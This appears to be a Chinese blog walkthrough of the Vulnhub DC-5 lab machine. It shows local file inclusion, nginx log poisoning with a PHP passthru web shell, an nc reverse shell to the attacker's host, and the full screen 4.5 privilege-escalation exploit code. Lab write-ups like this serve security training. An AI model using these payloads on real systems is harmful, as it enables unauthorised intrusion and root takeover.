---
layout: mypost
title: Vulnhub靶机DC5渗透
categories: [靶机]
---

靶机下载地址：[DC5](https://www.vulnhub.com/entry/dc-5,314/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/25/czCFSA.png)

DC5 地址：192.168.43.85

访问 web 页面

![](https://z3.ax1x.com/2021/04/25/czCew8.png)

![](https://z3.ax1x.com/2021/04/25/czCKYQ.png)

只有这个页面能交互

![](https://z3.ax1x.com/2021/04/25/czClSs.png)

get 方式提交表单

![](https://z3.ax1x.com/2021/04/25/czC3yq.png)

提交一次表单，似乎 footer 就变化一次

目测文件包含漏洞，thankyou.php 在底部调用 footer.php

找个 [字典](https://github.com/TheKingOfDuck/fuzzDicts/) 跑一跑

```bash
dirb http://192.168.43.85 Filenames_or_Directories_All.txt
```

![](https://z3.ax1x.com/2021/04/25/czC2kD.png)

确认了 footer.php 的存在

fuzz 一下

> 在安全测试中，模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。能够在一项产品投入市场使用之前对潜在的应当被堵塞的攻击渠道进行提示。
>
> 模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用。而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。模糊测试其数据具有不确定性，也没有明显的针对性，简单来说就是没有逻辑，没有常理。只要将准备好的那些杂乱的程序插入其中，然后等待bug的出现，而出现的漏洞是测试员们先前无法预知的。

```bash
wfuzz -c -w Filenames_or_Directories_All.txt --hw 66 192.168.43.85/thankyou.php\?FUZZ\=1
```

![](https://z3.ax1x.com/2021/04/25/czCxcn.png)

爆出 file 动态变量

还可以抓包用 thankyou.php?§var§=index.php 得到

或者用 php 伪协议直接读取 thankyou.php 代码也行

```url
http://192.168.43.85/thankyou.php?file=php://filter/read=convert.base64-encode/resource=thankyou.php
```

![](https://z3.ax1x.com/2021/04/25/czkwE6.png)

Base64 解码，其中

![](https://z3.ax1x.com/2021/04/25/czk6vd.png)

可以查看用户信息

```url
http://192.168.43.85/thankyou.php?file=/etc/passwd
```

> 大多 linux 系统的密码都和 /etc/passwd 和 /etc/shadow 这两个配置文件息息相关
> passwd 里储存了用户，shadow 里是密码的hash
> 出于安全考虑 passwd 全用户可读，root可写；shadow 仅root可读写的

![](https://z3.ax1x.com/2021/04/25/czFv1H.png)

尝试把反弹 shell 写入 nginx 服务器日志执行

先爆出可能存在的日志

```payload
/thankyou.php?file=/var/log/nginx/§var§.log
```

![](https://z3.ax1x.com/2021/04/25/czkXV0.png)

![](https://z3.ax1x.com/2021/04/25/czAp24.png)

有 access.log 和 error.log

![](https://z3.ax1x.com/2021/04/25/czAPM9.png)

![](https://z3.ax1x.com/2021/04/25/czAFq1.png)

传个一句话🐎

```shell
<?php passthru($_GET['cmd']); ?>  
```

nginx log 的地址带上 cmd 命令 

```payload
/thankyou.php?file=/var/log/nginx/access.log&cmd=nc 192.168.43.110 996 -c /bin/bash
```

![](https://z3.ax1x.com/2021/04/25/czAQsA.png)

成功上线，用 python 获取标准交互 shell

find sudo 权限不够

去 /tmp 目录下用脚本收集信息

```bash
cd /tmp
which python
which wget
```

用

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 
chmod +x LinEnum.sh
./LinEnum.sh
```

![](https://z3.ax1x.com/2021/04/25/czEdfO.png)

或者

```bash
wget https://www.securitysift.com/download/linuxprivchecker.py
python linuxprivchecker.py -s
```

![](https://z3.ax1x.com/2021/04/25/czEynA.png)

screen 4.5 很可疑，搜一下现成 exp

![](https://z3.ax1x.com/2021/04/25/czERtf.png)

选择上面那条

```bash
cat /usr/share/exploitdb/exploits/linux/local/41154.sh
```

![](https://z3.ax1x.com/2021/04/25/czE5cQ.png)

直接执行会出错，把里面 c 语言单独提出来

libhax.c

```bash
 cat << EOF > /tmp/libhax.c
> #include <stdio.h>
> #include <sys/types.h>
> #include <unistd.h>
> __attribute__ ((__constructor__))
> void dropshell(void){
>     chown("/tmp/rootshell", 0, 0);
>     chmod("/tmp/rootshell", 04755);
>     unlink("/etc/ld.so.preload");
>     printf("[+] done!\n");
> }
> EOF
```

编译得到 libhax.so

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

rootshell.c

```bash
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
```

编译得到 rootshell

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c
```

然后复制 41154.sh

```bash
cp  /usr/share/exploitdb/exploits/linux/local/41154.sh /tmp
```

修改得新 41154.sh 如下

![](https://z3.ax1x.com/2021/04/25/czVbKH.png)

将  libhax.so、rootshell、新41154.sh 上传靶机

```bash
cp /tmp/libhax.so /var/www/html
cp /tmp/rootshell /var/www/html
cp /tmp/41154.sh /var/www/html
```

```bash
sudo service apache2 start
```

```bash
wget http://192.168.43.110/libhax.so
wget http://192.168.43.110/rootshell
wget http://192.168.43.110/41154.sh
```

回想应该直接用 python，多此一举了...

执行脚本

```bash
chmod +x 41154.sh
./41154.sh
```

会出错

```bash
bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory
```

查得该 sh 作者用 windows 环境开发

用 vi / vim 修改

```vim
:set ff
:set ff=unix
:wq
```

再用 bash 执行

```bash
bash ./41154.sh
```

![](https://z3.ax1x.com/2021/04/25/czZIwn.png)

提权成功

![](https://z3.ax1x.com/2021/04/25/czZ7F0.png)

Pwned！